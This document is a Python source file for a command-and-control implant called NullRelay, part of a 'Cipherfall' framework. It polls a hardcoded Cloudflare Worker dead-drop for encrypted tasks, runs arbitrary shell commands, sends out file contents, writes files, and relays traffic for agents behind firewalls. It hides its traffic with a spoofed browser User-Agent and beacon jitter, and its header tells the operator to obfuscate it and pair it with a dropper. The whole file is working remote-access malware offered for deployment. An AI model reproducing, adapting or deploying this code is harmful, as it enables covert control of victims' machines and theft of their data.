#!/usr/bin/env python3
"""
NullRelay (agent.py) — Cipherfall C2 Agent (Cloudflare Worker channel)

Bake WORKER_URL and C2_PSK into the script before deployment, then obfuscate
with Modules/Obfuscator/obfuscator_py.py.

Communication model:
  The agent never connects to the C2 server. It only talks to the Cloudflare
  Worker, which acts as a dead-drop. All traffic is HTTPS on port 443 to a
  Cloudflare edge node; the C2 server's real IP is never involved.

  On each iteration:
    1. PUT /hb/{agent_id}          — heartbeat with encrypted sysinfo
    2. GET /task/{agent_id}        — poll for a pending task
       204 → nothing queued, sleep and repeat
       200 → decrypt task, execute, continue to step 3
    3. PUT /result/{task_id}       — upload encrypted output

Worker authentication:
  All requests carry  Authorization: Bearer <WORKER_TOKEN>.
  WORKER_TOKEN = HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]
  Derived identically on server and agent from the shared PSK.

Encryption:
  AES-256-GCM (pure Python, no external deps). NIST FIPS 197 + SP 800-38D.
  Key = PBKDF2-SHA256(PSK, b"cipherfall_c2_v1", 32, 100 000).
  Wire: base64(nonce[12] ‖ ciphertext ‖ GCM-tag[16]).

Agent identity:
  SHA-256 of /etc/machine-id (fallback: hostname), truncated to 32 hex chars.
  Deterministic and stable across reboots. Print with:  python3 agent.py --id

Supported commands:
  <any shell string>         executed via /bin/sh, stdout+stderr returned
  UPLOAD:/path/to/file       file read in binary mode, returned as base64
  /module relay start [port] start HTTP relay on port (default 443)
  /module relay stop         stop the relay
  /module relay status       show relay state

Environment variables (bake these before obfuscating):
  WORKER_URL      Cloudflare Worker URL   (required)
  C2_PSK          pre-shared passphrase   (default: changeme)
  C2_INT          base beacon interval s  (default: 30)
  C2_JITTER       ± jitter seconds        (default: 10)
  C2_RELAY_PORT   if set, start HTTP relay server on this port (default: 0 = off)
  C2_RELAY_BIND   relay listen address    (default: 0.0.0.0)

Relay mode (C2_RELAY_PORT or /module relay start):
  Enables a plain-HTTP server that proxies Worker API calls from isolated agents
  that cannot reach WORKER_URL directly (e.g. behind a firewall). The relay
  validates the Bearer token, then forwards to the real WORKER_URL over HTTPS.
  Isolated agent config: set WORKER_URL=http://<relay_host>:<relay_port>.
  Both relay and isolated agent must share the same PSK (token is identical).
  The relay runs in a daemon thread; normal beacon loop is unaffected.
  Can be started/stopped dynamically via /module relay without redeploying.

Dependencies: Python 3.6+ stdlib only. No pip required on the target.

Limitations:
  - No persistence; must be re-launched after reboot (pair with a dropper).
  - Runs as the deploying user; root required for privileged operations.
  - Output is buffered in memory before upload; avoid unbounded commands.
  - If a task is read but the agent crashes before sending the result, the
    task is irrecoverably lost from the Worker KV (re-queue manually).
  - Pure-Python AES is slower than a C extension; negligible for small payloads.
  - Relay listens on plain HTTP; use only on trusted internal networks.
"""

import base64, hashlib, hmac as _hmac, http.server, json, os, platform
import random, socket, socketserver, ssl, struct, subprocess, sys, threading, time
import urllib.error, urllib.request

WORKER_URL  = os.environ.get("WORKER_URL", "https://cipherfall-c2.elierocamora82.workers.dev").rstrip("/")
PSK         = os.environ.get("C2_PSK",        "changeme")
BEACON_INT  = int(os.environ.get("C2_INT",    "30"))
JITTER      = int(os.environ.get("C2_JITTER", "10"))
RELAY_PORT  = int(os.environ.get("C2_RELAY_PORT", "0"))
RELAY_BIND  = os.environ.get("C2_RELAY_BIND", "0.0.0.0")

_relay_server = None

# ── Pure-Python AES-256-GCM ──────────────────────────────────────────────────
# Implements NIST FIPS 197 (AES block cipher) and SP 800-38D (GCM mode).
# No external dependencies — stdlib only.

_S = bytes([
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
])

_RC = bytes([0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36])


def _xt(a: int) -> int:
    return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else (a << 1) & 0xff


def _ks(key: bytes):
    w = [key[i:i+4] for i in range(0, 32, 4)]
    for i in range(8, 60):
        t = w[i - 1]
        if i % 8 == 0:
            t = bytes(_S[b] for b in (t[1], t[2], t[3], t[0]))
            t = bytes([t[0] ^ _RC[i // 8 - 1], t[1], t[2], t[3]])
        elif i % 8 == 4:
            t = bytes(_S[b] for b in t)
        w.append(bytes(a ^ b for a, b in zip(w[i - 8], t)))
    return [bytes(b for wrd in w[i:i+4] for b in wrd) for i in range(0, 60, 4)]


def _aes(rk, blk: bytes) -> bytes:
    s = bytearray(blk)
    for i in range(16):
        s[i] ^= rk[0][i]
    for r in range(1, 15):
        t = bytearray(16)
        for i in range(16):
            t[i] = _S[s[i]]
        t[1], t[5], t[9],  t[13] = t[5],  t[9],  t[13], t[1]
        t[2], t[6], t[10], t[14] = t[10], t[14], t[2],  t[6]
        t[3], t[7], t[11], t[15] = t[15], t[3],  t[7],  t[11]
        if r < 14:
            for c in range(4):
                a, b, c2, d = t[c*4], t[c*4+1], t[c*4+2], t[c*4+3]
                t[c*4]   = _xt(a) ^ _xt(b) ^ b ^ c2 ^ d
                t[c*4+1] = a ^ _xt(b) ^ _xt(c2) ^ c2 ^ d
                t[c*4+2] = a ^ b ^ _xt(c2) ^ _xt(d) ^ d
                t[c*4+3] = _xt(a) ^ a ^ b ^ c2 ^ _xt(d)
        for i in range(16):
            t[i] ^= rk[r][i]
        s = t
    return bytes(s)


def _gmul(x: bytes, y: bytes) -> bytes:
    xi = int.from_bytes(x, 'big')
    yi = int.from_bytes(y, 'big')
    R  = 0xe1 << 120
    z  = 0
    for i in range(128):
        if (yi >> (127 - i)) & 1:
            z ^= xi
        xi = (xi >> 1) ^ (R if xi & 1 else 0)
    return z.to_bytes(16, 'big')


def _ghash(h: bytes, data: bytes) -> bytes:
    if len(data) % 16:
        data += b'\x00' * (-len(data) % 16)
    y = b'\x00' * 16
    for i in range(0, len(data), 16):
        y = _gmul(bytes(a ^ b for a, b in zip(y, data[i:i+16])), h)
    return y


def _gcm_enc(key: bytes, nonce: bytes, pt: bytes) -> tuple:
    rk  = _ks(key)
    h   = _aes(rk, b'\x00' * 16)
    j0  = nonce + b'\x00\x00\x00\x01'
    ctr = int.from_bytes(j0, 'big') + 1
    ct  = bytearray()
    for i in range(0, len(pt), 16):
        ks = _aes(rk, ctr.to_bytes(16, 'big'))
        ct += bytes(a ^ b for a, b in zip(ks, pt[i:i+16]))
        ctr += 1
    ct   = bytes(ct)
    lens = struct.pack('>QQ', 0, len(ct) * 8)
    tag  = bytes(a ^ b for a, b in zip(
        _aes(rk, j0),
        _ghash(h, ct + b'\x00' * (-len(ct) % 16) + lens),
    ))
    return ct, tag


def _gcm_dec(key: bytes, nonce: bytes, ct: bytes, tag: bytes) -> bytes:
    rk   = _ks(key)
    h    = _aes(rk, b'\x00' * 16)
    j0   = nonce + b'\x00\x00\x00\x01'
    lens = struct.pack('>QQ', 0, len(ct) * 8)
    exp  = bytes(a ^ b for a, b in zip(
        _aes(rk, j0),
        _ghash(h, ct + b'\x00' * (-len(ct) % 16) + lens),
    ))
    if not _hmac.compare_digest(exp, tag):
        raise ValueError("GCM authentication failed")
    ctr = int.from_bytes(j0, 'big') + 1
    pt  = bytearray()
    for i in range(0, len(ct), 16):
        ks = _aes(rk, ctr.to_bytes(16, 'big'))
        pt += bytes(a ^ b for a, b in zip(ks, ct[i:i+16]))
        ctr += 1
    return bytes(pt)


# ── Key material ─────────────────────────────────────────────────────────────

_KEY = hashlib.pbkdf2_hmac('sha256', PSK.encode(), b'cipherfall_c2_v1', 100_000, 32)
_WORKER_TOKEN = _hmac.new(PSK.encode(), b"worker_token", hashlib.sha256).hexdigest()[:32]

# ── HTTP (stdlib only) ────────────────────────────────────────────────────────

_SSL = ssl.create_default_context()
_UA  = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)
_HDRS = {"Authorization": f"Bearer {_WORKER_TOKEN}", "User-Agent": _UA}


def _put(url: str, body: str) -> int:
    req = urllib.request.Request(
        url, data=body.encode(),
        headers={**_HDRS, "Content-Type": "text/plain"},
        method="PUT",
    )
    try:
        with urllib.request.urlopen(req, context=_SSL, timeout=5):
            return 200
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _get(url: str) -> tuple:
    req = urllib.request.Request(url, headers=_HDRS)
    try:
        with urllib.request.urlopen(req, context=_SSL, timeout=5) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


# ── Crypto helpers ────────────────────────────────────────────────────────────

def _encrypt(obj: dict) -> str:
    nonce    = os.urandom(12)
    ct, tag  = _gcm_enc(_KEY, nonce, json.dumps(obj).encode())
    return base64.b64encode(nonce + ct + tag).decode()


def _decrypt(token: str) -> dict:
    raw          = base64.b64decode(token)
    nonce, ct, tag = raw[:12], raw[12:-16], raw[-16:]
    return json.loads(_gcm_dec(_KEY, nonce, ct, tag))


# ── Relay server ─────────────────────────────────────────────────────────────


def _get_lan_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return ""


class _RelayHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def _fwd(self, body=None):
        if self.headers.get("Authorization", "") != f"Bearer {_WORKER_TOKEN}":
            self.send_response(404); self.end_headers(); return
        url  = WORKER_URL + self.path
        hdrs = {"Authorization": f"Bearer {_WORKER_TOKEN}", "User-Agent": _UA}
        if body:
            hdrs["Content-Type"] = self.headers.get("Content-Type", "text/plain")
        req = urllib.request.Request(url, data=body, headers=hdrs, method=self.command)
        ctx = _SSL if url.startswith("https://") else None
        try:
            with urllib.request.urlopen(req, context=ctx, timeout=5) as r:
                data = r.read()
                self.send_response(r.status); self.end_headers(); self.wfile.write(data)
        except urllib.error.HTTPError as e:
            data = e.read()
            self.send_response(e.code); self.end_headers(); self.wfile.write(data)
        except Exception:
            self.send_response(503); self.end_headers()

    def do_GET(self): self._fwd()
    def do_PUT(self):
        n = int(self.headers.get("Content-Length", 0))
        self._fwd(self.rfile.read(n) if n else None)


def _start_relay():
    global _relay_server
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    srv = socketserver.ThreadingTCPServer((RELAY_BIND, RELAY_PORT), _RelayHandler)
    srv.daemon_threads = True
    _relay_server = srv
    threading.Thread(target=srv.serve_forever, daemon=True).start()


def _module_relay(args: list) -> str:
    global RELAY_PORT, _relay_server
    sub = args[0] if args else "start"
    if sub == "start":
        try:
            port = int(args[1]) if len(args) > 1 else 443
        except ValueError:
            return "[usage: /module relay start [port]]"
        if _relay_server:
            _relay_server.shutdown()
            _relay_server = None
        RELAY_PORT = port
        _start_relay()
        return f"[relay started :{port} → {WORKER_URL}]"
    if sub == "stop":
        if _relay_server:
            _relay_server.shutdown()
            _relay_server = None
            return "[relay stopped]"
        return "[relay not running]"
    if sub == "status":
        if _relay_server:
            return f"[relay active :{RELAY_PORT} → {WORKER_URL}]"
        return "[relay inactive]"
    return f"[unknown relay subcommand: {sub}]"


# ── Agent logic ───────────────────────────────────────────────────────────────

def _agent_id() -> str:
    try:
        with open("/etc/machine-id") as f:
            seed = f.read().strip()
    except OSError:
        seed = platform.node()
    return hashlib.sha256(seed.encode()).hexdigest()[:32]


def _sysinfo() -> dict:
    return {
        "hostname":   platform.node(),
        "os":         platform.system(),
        "release":    platform.release(),
        "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
        "cwd":        os.getcwd(),
        "relay_port": RELAY_PORT if _relay_server else 0,
        "relay_host": _get_lan_ip() if _relay_server else "",
        "worker_url": WORKER_URL,
        "beacon_int": BEACON_INT,
    }


def _exec(cmd: str) -> str:
    if cmd.startswith("/module "):
        parts = cmd[8:].split()
        if not parts:
            return "[usage: /module relay start [port] | stop | status]"
        if parts[0] == "relay":
            return _module_relay(parts[1:])
        return f"[unknown module: {parts[0]}]"
    if cmd.startswith("UPLOAD:"):
        try:
            with open(cmd[7:], "rb") as f:
                return base64.b64encode(f.read()).decode()
        except Exception as e:
            return f"[error: {e}]"
    if cmd.startswith("WRITE:"):
        rest  = cmd[6:]
        sep   = rest.index(":")
        path  = rest[:sep]
        try:
            data = base64.b64decode(rest[sep + 1:])
            with open(path, "wb") as f:
                f.write(data)
            return f"written {len(data)} bytes to {path}"
        except Exception as e:
            return f"[error: {e}]"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
        return (r.stdout + r.stderr) or "[no output]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error: {e}]"


AGENT_ID = _agent_id()


def _beacon():
    hb = _encrypt({"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo()})
    _put(f"{WORKER_URL}/hb/{AGENT_ID}", hb)

    status, body = _get(f"{WORKER_URL}/task/{AGENT_ID}")
    if status != 200:
        return

    task   = _decrypt(body)
    output = _exec(task["cmd"])
    result = _encrypt({"task_id": task["task_id"], "output": output})
    result_url = f"{WORKER_URL}/result/{task['task_id']}"
    for _ in range(5):
        if _put(result_url, result) == 200:
            break
        time.sleep(1)


def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--id":
        print(AGENT_ID)
        return
    if RELAY_PORT:
        _start_relay()
    while True:
        try:
            _beacon()
        except Exception:
            pass
        time.sleep(max(1, BEACON_INT + random.randint(-JITTER, JITTER)))


if __name__ == "__main__":
    main()
